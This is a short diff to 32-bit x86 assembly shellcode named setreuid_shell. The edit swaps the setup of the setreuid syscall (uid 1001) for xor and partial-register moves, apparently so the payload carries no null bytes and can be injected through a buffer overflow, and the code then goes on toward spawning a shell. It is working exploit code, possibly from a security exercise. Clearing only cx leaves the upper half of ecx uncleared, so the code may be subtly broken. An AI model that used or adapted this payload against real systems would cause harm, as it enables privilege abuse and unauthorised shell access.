@@ -5,9 +5,12 @@
 .global setreuid_shell
 
 setreuid_shell:
-mov 	eax, 70			# setreuid syscall on 32 bit Linux (/usr/include/asm/unistd_32.h)
-mov 	ebx, 1001		# real uid
-mov 	ecx, 1001		# effective uid
+xor 	eax, eax
+mov 	al, 70			# setreuid syscall on 32 bit Linux (/usr/include/asm/unistd_32.h)
+xor 	ebx, ebx
+mov 	bx, 1001		# real uid
+xor 	cx, cx
+mov 	cx, 1001		# effective uid
 int  	0x80
 xor 	eax, eax		# clear eax
 push 	eax
@@ -21,5 +24,3 @@ int 	0x80
 #xor 	eax, eax 		# clear eax (make it zero)
 #inc 	eax 			# place 1 into eax (exit syscall number)
 #int 	0x80
- 		
-
